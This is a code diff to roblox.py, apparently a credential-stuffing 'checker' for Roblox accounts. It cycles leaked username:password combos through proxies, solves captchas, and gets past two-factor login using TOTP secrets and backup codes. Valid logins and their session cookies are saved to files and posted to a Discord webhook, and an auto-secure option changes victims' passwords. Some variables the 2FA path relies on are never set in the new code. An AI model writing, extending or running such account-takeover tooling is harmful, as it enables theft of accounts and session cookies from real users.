@@ -1,4 +1,4 @@
-# roblox.py - FULL FILE - 2CAPTCHA ONLY
+# roblox.py - FULL FILE WITH 2FA SUPPORT
 import sys, os, string, random, re, queue
 from time import sleep
 from json import loads, dumps
@@ -14,7 +14,23 @@ from auth_intent import AuthIntent
 from ip_intelligence import IpIntelligence
 from util import get_config, random_string
 from secure import Secure
-from discord_webhook import DiscordWebhook, DiscordEmbed
+
+# Discord webhook - optional
+try:
+    from discord_webhook import DiscordWebhook, DiscordEmbed
+    HAS_DISCORD_WEBHOOK = True
+except ImportError:
+    HAS_DISCORD_WEBHOOK = False
+    DiscordWebhook = None
+    DiscordEmbed = None
+
+# Import 2FA handler
+try:
+    from twofa_handler import get_2fa_handler, TwoFAHandler
+    HAS_2FA = True
+except ImportError:
+    HAS_2FA = False
+    print("[!] 2FA handler not available")
 
 sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
 
@@ -39,6 +55,14 @@ SKIP_INVALID = config["skipCombos"]["skip_invalid"]
 SKIP_CHECKED = config["skipCombos"]["skip_checked"]
 DEBUG = config.get("debug", False)
 
+# Initialize 2FA handler
+twofa_handler = None
+if HAS_2FA:
+    try:
+        twofa_handler = get_2fa_handler(debug=DEBUG)
+    except:
+        pass
+
 badge_icons = {
     "Administrator": "<:Administrator:1345542368056578079>",
     "Ambassador": "<:Ambassador:1345542370195800147>",
@@ -62,14 +86,24 @@ def replace_badge_names(text: str) -> str:
 
 class Roblox:
     def __init__(self, lock: ThreadLock, counter: Counter, invalid: ComboCheck,
-                 checked_file: ComboCheck, locked: ComboCheck, account_queue: queue.Queue):
+                 checked_file: ComboCheck, locked: ComboCheck, account_queue: queue.Queue,
+                 proxies: list = None):
         self.lock = lock
         self.counter = counter
         self.invalid = invalid
         self.checked_file = checked_file
         self.locked = locked
         self.account_queue = account_queue
-        self.session = Session.random_session()
+        self.proxies = proxies or []
+        self.twofa_used = False  # Track if 2FA was used
+        
+        # Create session with random proxy
+        proxy = random.choice(self.proxies) if self.proxies else None
+        if proxy:
+            self.session = Session(proxy=proxy)
+            print(f"[PROXY] Using proxy for session")
+        else:
+            self.session = Session.random_session()
 
     def check(self):
         while True:
@@ -79,9 +113,13 @@ class Roblox:
                 break
 
             try:
-                parts = raw.strip().split(":", 1)
-                if len(parts) != 2: continue
-                self.account = parts
+                # Parse account - support format: user:pass or user:pass:2fa_secret
+                parts = raw.strip().split(":", 2)
+                if len(parts) < 2:
+                    continue
+                
+                self.account = [parts[0], parts[1]]
+                self.twofa_secret = parts[2] if len(parts) > 2 else None
                 combo = f"{self.account[0]}:{self.account[1]}"
 
                 if SKIP_INVALID and self.invalid.contains(combo): continue
@@ -95,60 +133,325 @@ class Roblox:
                 self.counter.increment()
 
     def _perform_login(self):
-        ip = IpIntelligence(self.session)
-        self.session.headers.update({
-            "Accept-Language": ip.get_accept_language(),
-            "Origin": "https://www.roblox.com",
-            "Referer": "https://www.roblox.com/login",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0 Safari/537.36"
-        })
-
-        auth = AuthIntent.get_auth_intent(self.session)
-        if not auth:
-            Output("ERROR").log("Failed to get auth intent")
-            return
-        self.sai = auth
-
-        test = self.session.post("https://auth.roblox.com/v2/login", json={
-            "ctype": "Username", "cvalue": self.account[0], "password": self.account[1]
-        })
-        self.ctype = "Username" if test.status_code == 200 else "Email"
-
+        """API-First Login - Simple and accurate like reference checker."""
+        username, password = self.account[0], self.account[1]
+        
+        # Get CSRF token first
+        if not self.session.csrf_token:
+            self.session.get_csrf_token()
+        
+        # Store credentials for browser solver (if needed later)
+        self.session.username = username
+        self.session.password = password
+        
+        # Simple API login (like reference code)
         payload = {
-            "ctype": self.ctype, "cvalue": self.account[0], "password": self.account[1],
-            "secureAuthenticationIntent": self.sai
+            "ctype": "Username",
+            "cvalue": username,
+            "password": password
         }
-
-        resp = self.session.post("https://auth.roblox.com/v2/login", json=payload)
-        csrf = resp.headers.get("x-csrf-token")
-        if csrf:
-            self.session.headers["x-csrf-token"] = csrf
-            resp = self.session.post("https://auth.roblox.com/v2/login", json=payload)
-
-        data = resp.json()
-
-        if resp.status_code == 200:
-            cookie = self.session.cookies.get(".ROBLOSECURITY")
-            uid = data.get("user", {}).get("id")
+        
+        try:
+            resp = self.session.post("https://auth.roblox.com/v1/login", json=payload, timeout=30)
+            data = resp.json() if resp.text else {}
+        except Exception as e:
+            print(f"[LOGIN] ❌ Request error for {username}: {e}")
+            self._invalid()
+            return
+        
+        # Check for errors (like reference code)
+        if "errors" in data:
+            for error in data["errors"]:
+                code = error.get("code", -1)
+                message = error.get("message", "")
+                
+                # Code 1 = Incorrect password
+                if code == 1:
+                    print(f"[LOGIN] ❌ Invalid: {username}")
+                    self._invalid()
+                    return
+                
+                # Code 2 = Captcha required - SWITCH TO BROWSER
+                elif code == 2:
+                    print(f"[LOGIN] 🧩 Captcha for {username} - opening browser...")
+                    self._solve_captcha_browser()
+                    return
+                
+                # Code 0 = Challenge or multi-factor
+                elif code == 0:
+                    if "Challenge" in message or "challenge" in message.lower():
+                        print(f"[LOGIN] 🧩 Captcha challenge for {username} - opening browser...")
+                        self._solve_captcha_browser()
+                        return
+                    elif "users" in error.get("fieldData", ""):
+                        self.handle_multi(error)
+                        return
+                    else:
+                        print(f"[LOGIN] ❌ Error 0 for {username}: {message}")
+                        self._invalid()
+                        return
+                
+                # 2FA required
+                elif code in [17, 23, 24]:
+                    self._handle_2fa_challenge(data, payload)
+                    return
+                
+                # Other error
+                else:
+                    print(f"[LOGIN] ❌ Error {code} for {username}: {message}")
+                    self._invalid()
+                    return
+            
+            self._invalid()
+            return
+        
+        # Success - logged in!
+        if "user" in data:
+            user_data = data["user"]
+            cookie = self.session.cookies.get(".ROBLOSECURITY", "")
+            uid = user_data.get("id")
+            
             if cookie and uid:
+                print(f"[LOGIN] ✅ HIT: {username}")
                 self.handle_valid({"userId": uid, "cookie": cookie})
             return
-
+        
+        # Check for challenge ID (captcha)
         if "challengeId" in data:
-            metadata = data.get("challengeMetadata", "{}")
-            token = get_token(self.session, metadata)
-            if token:
-                self._continue_challenge(data["challengeId"], token)
+            print(f"[LOGIN] 🧩 Challenge for {username} - opening browser...")
+            self._solve_captcha_browser()
             return
+        
+        # 2FA
+        if "twoStepVerification" in data:
+            self._handle_2fa_challenge(data, payload)
+            return
+        
+        # Unknown response
+        print(f"[LOGIN] ❓ Unknown response for {username}")
+        self._invalid()
+    
+    def _solve_captcha_browser(self):
+        """Solve captcha by opening browser - only called when captcha detected."""
+        username, password = self.account[0], self.account[1]
+        
+        # Get captcha token from browser solver
+        token = get_token(self.session, "")
+        
+        if token and token != "SKIP":
+            # Retry login with captcha token
+            payload = {
+                "ctype": "Username",
+                "cvalue": username,
+                "password": password,
+                "captchaToken": token
+            }
+            
+            try:
+                resp = self.session.post("https://auth.roblox.com/v1/login", json=payload, timeout=30)
+                data = resp.json() if resp.text else {}
+                
+                if "user" in data:
+                    user_data = data["user"]
+                    cookie = self.session.cookies.get(".ROBLOSECURITY", "")
+                    uid = user_data.get("id")
+                    
+                    if cookie and uid:
+                        print(f"[LOGIN] ✅ HIT after captcha: {username}")
+                        self.handle_valid({"userId": uid, "cookie": cookie})
+                        return
+                
+                # Check for errors after captcha
+                if "errors" in data:
+                    for error in data["errors"]:
+                        code = error.get("code", -1)
+                        if code == 1:
+                            self._invalid()
+                            return
+                        elif code in [17, 23, 24]:
+                            self._handle_2fa_challenge(data, payload)
+                            return
+                
+                self._invalid()
+            except Exception as e:
+                print(f"[LOGIN] ❌ Error after captcha: {e}")
+                self._invalid()
+        else:
+            print(f"[LOGIN] ❌ Captcha failed for {username}")
+            self._invalid()
 
-        err = data.get("errors", [{}])[0]
-        code = err.get("code", -1)
+    def _is_2fa_challenge(self, data: dict) -> bool:
+        """Check if this is a 2FA challenge."""
+        errors = data.get("errors", [])
+        for err in errors:
+            code = err.get("code", -1)
+            # Code 17 = 2FA required, Code 23 = 2FA verification needed
+            if code in [17, 23, 24]:
+                return True
+            # Check message for 2FA keywords
+            msg = err.get("message", "").lower()
+            if "two-step" in msg or "2-step" in msg or "verification code" in msg:
+                return True
+        return False
 
-        if code == 1: self._invalid()
-        elif code == 4: self._locked()
-        elif code in (6, 7): self._banned(code == 6)
-        elif code == 0 and "users" in err.get("fieldData", ""):
-            self.handle_multi(err)
+    def _handle_2fa_challenge(self, data: dict, original_payload: dict):
+        """Handle 2FA verification challenge."""
+        if DEBUG:
+            Output("2FA").log(f"2FA challenge detected for {self.account[0]}")
+        
+        # Get 2FA code
+        code = None
+        
+        # First check inline 2FA secret (from accounts.txt format)
+        if self.twofa_secret:
+            if DEBUG:
+                Output("2FA").log(f"Using inline 2FA secret")
+            code = self._generate_totp(self.twofa_secret)
+        
+        # Then check 2FA handler
+        elif twofa_handler and twofa_handler.has_2fa(self.account[0]):
+            if DEBUG:
+                Output("2FA").log(f"Found 2FA config for {self.account[0]}")
+            code = twofa_handler.get_totp_code(self.account[0])
+            
+            # If no TOTP, try backup codes
+            if not code:
+                code = twofa_handler.get_backup_code(self.account[0])
+                if code:
+                    self.twofa_used = True
+                    if DEBUG:
+                        Output("2FA").log(f"Using backup code")
+        
+        if not code:
+            if DEBUG:
+                Output("2FA").log(f"No 2FA code available for {self.account[0]}")
+            self._needs_2fa()
+            return
+        
+        if DEBUG:
+            Output("2FA").log(f"Submitting 2FA code: {code[:2]}****")
+        
+        # Submit 2FA code
+        # Roblox uses different endpoints for 2FA
+        try:
+            # Method 1: Direct verification
+            verify_payload = {
+                "ctype": self.ctype,
+                "cvalue": self.account[0],
+                "password": self.account[1],
+                "secureAuthenticationIntent": self.sai,
+                "twoFactorCode": code
+            }
+            
+            resp = self.session.post("https://auth.roblox.com/v2/login", json=verify_payload)
+            
+            # Check for CSRF token
+            csrf = resp.headers.get("x-csrf-token")
+            if csrf:
+                self.session.headers["x-csrf-token"] = csrf
+                resp = self.session.post("https://auth.roblox.com/v2/login", json=verify_payload)
+            
+            data = resp.json()
+            
+            if resp.status_code == 200:
+                cookie = self.session.cookies.get(".ROBLOSECURITY")
+                uid = data.get("user", {}).get("id")
+                if cookie and uid:
+                    self.twofa_used = True
+                    self.handle_valid({"userId": uid, "cookie": cookie})
+                    return
+            
+            # Method 2: Challenge-based verification
+            if "challengeId" in data:
+                challenge_id = data["challengeId"]
+                
+                # Verify 2FA code
+                verify_resp = self.session.post(
+                    "https://apis.roblox.com/challenge/v1/continue",
+                    json={
+                        "challengeId": challenge_id,
+                        "challengeType": "twostep",
+                        "challengeMetadata": code
+                    }
+                )
+                
+                sleep(1)
+                
+                # Retry login
+                resp = self.session.post("https://auth.roblox.com/v2/login", json=verify_payload)
+                data = resp.json()
+                
+                if resp.status_code == 200:
+                    cookie = self.session.cookies.get(".ROBLOSECURITY")
+                    uid = data.get("user", {}).get("id")
+                    if cookie and uid:
+                        self.twofa_used = True
+                        self.handle_valid({"userId": uid, "cookie": cookie})
+                        return
+            
+            # Check for errors
+            err = data.get("errors", [{}])[0]
+            code_err = err.get("code", -1)
+            
+            if code_err in [17, 23, 24]:
+                if DEBUG:
+                    Output("2FA").log(f"2FA code rejected for {self.account[0]}")
+                self._invalid_2fa()
+            elif code_err == 1:
+                self._invalid()
+            elif code_err == 4:
+                self._locked()
+            else:
+                if DEBUG:
+                    Output("2FA").log(f"Unknown 2FA error: {err}")
+                self._invalid()
+                
+        except Exception as e:
+            if DEBUG:
+                Output("2FA").log(f"2FA error: {e}")
+            self._invalid()
+
+    def _generate_totp(self, secret: str) -> str:
+        """Generate TOTP code from secret."""
+        try:
+            import hmac
+            import hashlib
+            import base64
+            import struct
+            
+            # Remove spaces and convert to uppercase
+            secret = secret.upper().replace(' ', '')
+            
+            # Decode base32 secret
+            secret_bytes = base64.b32decode(secret, casefold=True)
+            
+            # Get current time interval (30 second window)
+            time_interval = int(time.time() // 30)
+            
+            # Pack time as big-endian 64-bit integer
+            time_bytes = struct.pack('>Q', time_interval)
+            
+            # Calculate HMAC-SHA1
+            hmac_result = hmac.new(secret_bytes, time_bytes, hashlib.sha1).digest()
+            
+            # Get offset from last nibble
+            offset = hmac_result[-1] & 0x0F
+            
+            # Get 4 bytes starting at offset
+            code_bytes = hmac_result[offset:offset + 4]
+            
+            # Convert to integer (masking sign bit)
+            code_int = struct.unpack('>I', code_bytes)[0] & 0x7FFFFFFF
+            
+            # Get last 6 digits
+            code = str(code_int % 1000000).zfill(6)
+            
+            return code
+            
+        except Exception as e:
+            if DEBUG:
+                Output("2FA").log(f"TOTP generation error: {e}")
+            return None
 
     def _continue_challenge(self, cid, token):
         sleep(1)
@@ -159,10 +462,20 @@ class Roblox:
 
     def handle_valid(self, user_id_and_cookie):
         acc_info = AccountInfo.get_account_info(self.session, user_id_and_cookie["userId"])
-        combo = f"{self.account[0]}:{self.account[1]}:{user_id_and_cookie['cookie']}"
+        
+        # Build combo with 2FA marker if used
+        if self.twofa_used:
+            combo = f"{self.account[0]}:{self.account[1]}:{user_id_and_cookie['cookie']} [2FA]"
+        else:
+            combo = f"{self.account[0]}:{self.account[1]}:{user_id_and_cookie['cookie']}"
 
         with lock.get_lock():
             open("output/valid_combo.txt", "a", encoding="utf-8").write(combo + "\n")
+            
+            # Also save to 2FA verified file if 2FA was used
+            if self.twofa_used:
+                os.makedirs("output/2fa_verified", exist_ok=True)
+                open("output/2fa_verified/2fa_verified.txt", "a", encoding="utf-8").write(combo + "\n")
 
         if AUTO_SECURE:
             new_pass = PREFIX + random_string(10)
@@ -199,7 +512,7 @@ class Roblox:
                 open(f"output/usernames/{len(name)}chars.txt", "a", encoding="utf-8").write(combo + "\n")
 
     def _send_webhook(self, acc_info, cookie):
-        embed = DiscordEmbed(title="Valid Account", color=0x00FF00)
+        embed = DiscordEmbed(title="Valid Account" + (" [2FA]" if self.twofa_used else ""), color=0x00FF00)
         embed.add_embed_field(name="Combo", value=f"`{self.account[0]}:{self.account[1]}`", inline=False)
         embed.add_embed_field(name="Robux", value=acc_info["Robux"], inline=True)
         embed.add_embed_field(name="RAP", value=acc_info["RAP"], inline=True)
@@ -231,6 +544,20 @@ class Roblox:
         file = "output/terminated.txt" if term else "output/temp_banned.txt"
         with lock.get_lock():
             open(file, "a", encoding="utf-8").write(combo + "\n")
+
+    def _needs_2fa(self):
+        """Handle accounts that need 2FA but no code available."""
+        combo = f"{self.account[0]}:{self.account[1]}"
+        with lock.get_lock():
+            os.makedirs("output/needs_2fa", exist_ok=True)
+            open("output/needs_2fa/needs_2fa.txt", "a", encoding="utf-8").write(combo + "\n")
+
+    def _invalid_2fa(self):
+        """Handle accounts with invalid 2FA code."""
+        combo = f"{self.account[0]}:{self.account[1]}"
+        with lock.get_lock():
+            os.makedirs("output/invalid_2fa", exist_ok=True)
+            open("output/invalid_2fa/invalid_2fa.txt", "a", encoding="utf-8").write(combo + "\n")
 
     def handle_multi(self, err):
         users = loads(err["fieldData"]).get("users", [])
